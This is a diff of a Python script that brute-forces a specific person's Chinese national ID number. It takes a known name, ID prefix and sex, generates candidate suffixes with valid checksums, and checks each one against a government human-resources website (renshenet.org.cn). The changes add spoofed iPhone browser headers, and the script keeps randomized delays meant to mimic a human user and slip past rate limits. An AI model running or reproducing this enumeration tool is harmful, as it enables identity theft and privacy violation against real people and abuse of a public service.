@@ -3,7 +3,7 @@ import requests
 import asyncio
 import aiohttp
 import argparse
-import time
+import sys
 
 
 # 生成校验码函数（基于身份证校验规则）
@@ -27,9 +27,18 @@ async def verify_idcard(session, idcard, name):
     headers = {
         'Host': 'www.renshenet.org.cn',
         'Accept': 'application/json, text/plain, */*',
-        'User-Agent': 'Mozilla/5.0',
+        'Sec-Fetch-Site': 'same-origin',
+        'depCode': '0004',
+        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Sec-Fetch-Mode': 'cors',
         'Content-Type': 'application/json;charset=UTF-8',
+        'Origin': 'https://www.renshenet.org.cn',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
         'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
+        'Content-Length': '47',
+        'Connection': 'keep-alive',
+        'Sec-Fetch-Dest': 'empty'
     }
 
     data = {
@@ -52,40 +61,44 @@ async def verify_idcard(session, idcard, name):
         verified_cache[idcard] = False
 
 
-# 主异步函数
-async def main(idcard_prefix, name, gender):
-    if gender == "男":
-        idcard_17th = str(random.randint(1, 9))
-    elif gender == "女":
-        idcard_17th = str(random.randint(0, 8))
-    else:
-        print("性别输入错误，请输入'男'或'女'")
-        return
+# 使用 argparse 模块处理命令行输入
+parser = argparse.ArgumentParser(description="身份证生成和验证工具")
+parser.add_argument('-ic', '--idcard_prefix', type=str, required=True, help="身份证号码前14位")
+parser.add_argument('--name', '-n', type=str, required=True, help="姓名")
+parser.add_argument('--sex', '-s', type=str, choices=["男", "女"], required=True, help="性别（男/女）")
 
-    idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
+# 如果没有提供参数，显示帮助信息
+if len(sys.argv) == 1:
+    parser.print_help()
+    sys.exit(1)
+
+args = parser.parse_args()
+
+# 根据性别生成身份证号码的第17位
+if args.sex == "男":
+    idcard_17th = str(random.randint(1, 9))
+elif args.sex == "女":
+    idcard_17th = str(random.randint(0, 8))
+else:
+    print("性别输入错误，请输入'男'或'女'")
+    sys.exit(1)
+
+idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
+
+async def main_logic():
     async with aiohttp.ClientSession() as session:
         for suffix in idcard_suffixes:
-            idcard_without_checksum = idcard_prefix + idcard_17th + suffix
+            idcard_without_checksum = args.idcard_prefix + idcard_17th + suffix
             checksum = calculate_checksum(idcard_without_checksum)
             idcard = idcard_without_checksum + checksum
 
             # 设置请求频率限制，最多每秒处理3个请求
-            await verify_idcard(session, idcard, name)
+            await verify_idcard(session, idcard, args.name)
 
             # 加入随机延时，模拟用户行为
             delay = random.uniform(0.5, 2)  # 随机延时 0.5 到 2 秒之间
             print(f"等待 {delay:.2f} 秒...")
             await asyncio.sleep(delay)
 
-
-if __name__ == "__main__":
-    # 使用 argparse 模块处理命令行输入
-    parser = argparse.ArgumentParser(description="身份证生成和验证工具")
-    parser.add_argument('--idcard_prefix', type=str, required=True, help="身份证号码前14位")
-    parser.add_argument('--name', type=str, required=True, help="姓名")
-    parser.add_argument('--gender', type=str, choices=["男", "女"], required=True, help="性别（男/女）")
-
-    args = parser.parse_args()
-
-    # 运行异步函数
-    asyncio.run(main(args.idcard_prefix, args.name, args.gender))
+# 运行异步逻辑
+asyncio.run(main_logic())
